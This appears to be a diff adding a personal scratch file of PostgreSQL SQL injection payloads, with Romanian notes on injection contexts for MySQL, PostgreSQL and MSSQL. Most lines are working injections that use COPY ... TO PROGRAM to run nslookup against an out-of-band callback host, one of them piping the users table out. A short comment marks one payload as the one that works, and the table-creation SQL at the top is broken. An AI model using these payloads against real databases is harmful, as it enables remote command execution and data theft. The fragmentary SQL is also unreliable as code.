@@ -1,0 +1,88 @@
+CREATE TABLE users (
+  ID SERIAL PRIMARY KEY,
+  name VARCHAR(30),
+  password VARCHAR(30)
+  
+  
+  INSERT INTO users (name, pasword)
+  VALUES ('stefanita', 'parola123'), ('Alex', 'PreaSigur4Mine?');
+  
+  
+  `SELECT * FROM users WHERE password = 'parola123' AND name = ''||(copy (SELECT '') to program 'nslookup ynsh9dam5yzodwyudoi5z0bf7yxvkgr6z.oast.live')||''`
+ 								'||(copy (SELECT * FROM users) to program 'nslookup ynsh9dam5yzodwyudoi5z0bf7yxvkgr6z.oast.live')||'
+ 								'||(copy "" to program 'nslookup ynsh9dam5yzodwyudoi5z0bf7yxvkgr6z.oast.live')||'
+ 								'||(copy '' to program 'nslookup ynsh9dam5yzodwyudoi5z0bf7yxvkgr6z.oast.live')||'
+ 								
+ 								
+ SELECT * FROM users WHERE password = 'parola123' AND name = '';c := 'copy (SELECT '''') to program ''nslookup ynsh9dam5yzodwyudoi5z0bf7yxvkgr6z.oast.live''';execute c; /*
+
+
+
+
+   EXECUTE 'copy (SELECT '''') to program ''nslookup '||p||'.ynsh9dam5yzodwyudoi5z0bf7yxvkgr6z.oast.live''' ;
+  SQL:
+  	Mysql
+  		where 
+  			variatiuni de enclosing tags " ' cifra, e variabila
+  		order by/group by
+  			variatiuni de enclosing tags " ' ` 
+  		
+  			variatiuni de enclosing tags " ' ` 
+  	Postgresql
+  		order by/group by
+  			variatiuni de enclosing tags " ' ` 
+  		celalalt
+  			variatiuni de enclosing tags " ' ` 
+  	Mssql
+  		where 
+  			variatiuni de enclosing tags " ' ` 
+  		having
+  			variatiuni de enclosing tags " ' ` 
+
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  ASTA E BUNAAA !!!!
+  
+  
+  ';copy (SELECT '') to program 'nslookup ynsh9dam5yzodwyudoi5z0bf7yxvkgr6z.oast.live'; --
+  
+  
+  
+
+   1 = 1;copy (SELECT '') to program 'nslookup ynsh9dam5yzodwyudoi5z0bf7yxvkgr6z.oast.live'; --
+   
+   1;copy (SELECT '') to program 'nslookup ynsh9dam5yzodwyudoi5z0bf7yxvkgr6z.oast.live'; --
+     
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
